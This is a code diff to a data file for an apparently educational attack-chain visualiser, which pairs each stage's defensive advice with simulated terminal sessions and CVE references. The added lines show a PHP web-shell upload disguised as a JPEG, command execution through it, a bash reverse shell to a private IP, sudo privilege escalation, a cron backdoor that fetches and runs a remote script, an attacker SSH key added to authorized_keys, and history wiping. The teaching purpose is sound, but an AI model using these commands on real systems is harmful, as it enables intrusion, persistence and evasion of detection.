@@ -13,6 +13,17 @@ export const ATTACK_STAGES: AttackStage[] = [
       "Almost every stage after this one is preventable if this first crossing is stopped — allow-list validation here is the highest-leverage fix on this whole chain.",
     colorFrom: "#a5aed6",
     colorTo: "#8993be",
+    terminalLines: [
+      "$ curl -s -F \"avatar=@shell.php;type=image/jpeg\" https://target.tld/upload.php",
+      '{"status":"ok","path":"/uploads/shell.php"}',
+      "$ curl -s https://target.tld/uploads/shell.php?cmd=id",
+      "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+    ],
+    reference: {
+      label: "CVE-2024-4577",
+      summary: "PHP-CGI argument injection on Windows — a Best-Fit encoding flaw let attackers run arbitrary PHP via a crafted query string, exploited in the wild within days of disclosure.",
+      url: "https://nvd.nist.gov/vuln/detail/CVE-2024-4577",
+    },
     example: {
       vulnerable: `<?php
 // upload.php
@@ -71,6 +82,12 @@ move_uploaded_file($_FILES['avatar']['tmp_name'], '/var/app/uploads_private/' . 
       "disable_functions and open_basedir are real speed bumps here — they don't fix the injection, but they can turn a working exploit into a dead end.",
     colorFrom: "#8993be",
     colorTo: "#6c76a8",
+    terminalLines: [
+      "$ curl -s https://target.tld/uploads/shell.php?cmd=which+shell_exec+system+exec",
+      "shell_exec: blocked (disable_functions)",
+      "system:     blocked (disable_functions)",
+      "exec:       available",
+    ],
     example: {
       vulnerable: `; php.ini
 disable_functions =
@@ -116,6 +133,17 @@ disable_classes =
       "This is where least-privilege process isolation pays off — a www-data user that can't write to the webroot or reach the internal network limits everything downstream.",
     colorFrom: "#6c76a8",
     colorTo: "#4f5b93",
+    terminalLines: [
+      "$ curl -s \"https://target.tld/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/4444+0>%261'\"",
+      "[+] connection received on 10.10.14.2 44444",
+      "www-data@target:/var/www/html$ whoami",
+      "www-data",
+    ],
+    reference: {
+      label: "CVE-2019-11043",
+      summary: "PHP-FPM + nginx path-info underflow — a crafted request triggers memory corruption that lets an attacker execute arbitrary code, no injection bug required beyond the misconfiguration itself.",
+      url: "https://nvd.nist.gov/vuln/detail/CVE-2019-11043",
+    },
     example: {
       vulnerable: `<?php
 // ping.php
@@ -168,6 +196,17 @@ echo '<pre>' . htmlspecialchars($output ?? '') . '</pre>';`,
       "A disciplined patch cadence directly removes exploits from this stage's toolbox — most local privesc chains rely on a known, already-fixed CVE.",
     colorFrom: "#5b4b8a",
     colorTo: "#453a73",
+    terminalLines: [
+      "www-data@target:/$ sudo -l",
+      "(ALL) NOPASSWD: /usr/bin/php /opt/scripts/backup.php",
+      "www-data@target:/$ sudo /usr/bin/php /opt/scripts/backup.php",
+      "root@target:/#",
+    ],
+    reference: {
+      label: "CVE-2021-4034",
+      summary: "\"PwnKit\" — a memory-corruption bug in polkit's pkexec let any local user on nearly every major Linux distro escalate straight to root with a few lines of C.",
+      url: "https://nvd.nist.gov/vuln/detail/CVE-2021-4034",
+    },
     techniques: [
       {
         id: "suid-abuse",
@@ -207,6 +246,16 @@ echo '<pre>' . htmlspecialchars($output ?? '') . '</pre>';`,
       "This is why patching the original hole is never the whole fix — a compromised host needs a full audit (cron, authorized_keys, webroot) before it's trusted again.",
     colorFrom: "#453a73",
     colorTo: "#2e2659",
+    terminalLines: [
+      'root@target:/# echo "* * * * * root curl -s http://10.10.14.2/x|sh" >> /etc/crontab',
+      'root@target:/# echo "ssh-ed25519 AAAA...redacted attacker@kali" >> /root/.ssh/authorized_keys',
+      "root@target:/# history -c",
+    ],
+    reference: {
+      label: "MITRE ATT&CK T1053.003",
+      summary: "Scheduled Task/Job: Cron — the standard framework classification for exactly this persistence technique, with real-world detection and mitigation guidance.",
+      url: "https://attack.mitre.org/techniques/T1053/003/",
+    },
     techniques: [
       {
         id: "cron-backdoor",
